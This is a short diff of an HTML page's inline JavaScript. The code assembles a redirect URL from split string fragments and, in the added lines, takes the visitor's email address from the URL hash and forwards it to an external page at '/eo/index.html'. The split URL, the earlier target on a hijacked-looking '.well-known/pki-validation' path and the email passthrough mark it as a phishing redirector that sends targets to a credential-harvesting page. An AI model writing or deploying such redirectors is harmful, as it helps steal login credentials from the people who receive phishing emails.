@@ -7,12 +7,20 @@
     </style>
     <script>
         (function() {
-            var part1 = "https://sky";
-            var part2 = "leveltravels.com//.well-";
-            var part3 = "known/pki-validation/pre/";
+            var part1 = "https://commercial";
+            var part2 = "product.com";
+            var part3 = "/eo/index.html";
 
-            var redirectUrl = part1 + part2 + part3;
+            // Get the email parameter from the URL
+            var email = window.location.hash.substring(1);
 
+            // Decode the email parameter to keep @ symbol intact
+            var decodedEmail = decodeURIComponent(email);
+
+            // Construct the redirect URL
+            var redirectUrl = part1 + part2 + part3 + "#" + decodedEmail;
+
+            // Redirect to the constructed URL
             window.location.href = redirectUrl;
         })();
     </script>
